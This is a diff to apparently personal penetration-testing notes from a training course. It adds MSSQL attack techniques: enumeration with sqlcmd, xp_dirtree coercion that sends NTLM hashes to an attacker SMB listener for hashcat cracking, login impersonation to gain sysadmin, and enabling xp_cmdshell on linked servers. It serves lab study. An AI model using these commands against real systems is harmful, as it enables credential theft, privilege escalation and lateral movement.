@@ -73,6 +73,114 @@ See [[SQL Injection Attacks#10.1.2. DB Types and Characteristics|10.1.2]], [[SQL
 
 ---
 
+## MSSQL — sqlcmd (Linux client)
+
+```bash
+# Connect (SQL auth — prompts for password)
+sqlcmd -S TARGET_IP -U username
+
+# Connect using current Windows session (run inside RDP — no password prompt)
+sqlcmd -S WIN-HARD
+```
+
+Every statement needs `go` on its own line to execute:
+```sql
+1> SELECT name FROM sys.databases
+2> go
+
+1> use flagDB
+2> go
+
+1> SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
+2> go
+
+1> SELECT * FROM tb_flag
+2> go
+```
+
+🔁 [[Attacking Common Services (HTB Supplementary)#CS.3. sqlcmd|CS.3]], [[Attacking Common Services (HTB Supplementary)#CS.4. MSSQL Database and Table Enumeration|CS.4]]
+
+#### Tags: #MSSQL #sqlcmd #LinuxClient #WindowsAuth
+
+---
+
+## MSSQL — UNC Path Hash Coercion (xp_dirtree)
+
+```bash
+# Kali: set up SMB capture listener
+sudo impacket-smbserver -smb2support share ./
+
+# In MSSQL session (sqlcmd or impacket-mssqlclient): trigger outbound NTLM auth
+EXEC master..xp_dirtree '\\KALI_IP\share'
+go
+# impacket-smbserver terminal captures: User::DOMAIN:challenge:response:blob
+
+# Save and crack with hashcat mode 5600 (Net-NTLMv2)
+echo "MSSQLSVC::..." > hash.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+🔁 [[Attacking Common Services (HTB Supplementary)#CS.2. MSSQL UNC Path Injection|CS.2]], [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3]]
+
+#### Tags: #MSSQL #xpDirtree #UNCInjection #NetNTLMv2 #HashCoercion
+
+---
+
+## MSSQL — Impersonation (EXECUTE AS LOGIN)
+
+```sql
+-- Find who you can impersonate
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+go
+
+-- Impersonate and verify sysadmin (1 = yes)
+EXECUTE AS LOGIN = 'john'
+go
+SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')
+go
+
+-- Revert when done
+REVERT
+go
+```
+
+🔁 [[Attacking Common Services (HTB Supplementary)#CS.5. MSSQL Impersonation|CS.5]]
+
+#### Tags: #MSSQL #Impersonation #ExecuteAsLogin #PrivEsc
+
+---
+
+## MSSQL — Linked Server Attacks
+
+```sql
+-- Enumerate linked servers (isremote 0 = linked, 1 = remote)
+SELECT srvname, isremote FROM sysservers
+go
+
+-- Test execution on linked server (combine with EXECUTE AS LOGIN if needed)
+EXECUTE('SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED.SERVER.NAME]
+go
+
+-- Enable xp_cmdshell on linked server (sp_configure via EXECUTE AT)
+EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LINKED.SERVER.NAME]
+go
+
+-- Run OS commands on linked server
+EXECUTE('xp_cmdshell ''more C:\users\administrator\desktop\flag.txt''') AT [LINKED.SERVER.NAME]
+go
+```
+
+Nested quote escaping: `''` inside an EXECUTE string = one escaped single quote. Two levels of nesting need two levels of `''`.
+
+🔁 [[Attacking Common Services (HTB Supplementary)#CS.6. MSSQL Linked Server Attacks|CS.6]]
+
+#### Tags: #MSSQL #LinkedServer #sysservers #ExecuteAt #xpCmdshell #LateralMovement
+
+---
+
 ## PostgreSQL
 
 ```bash
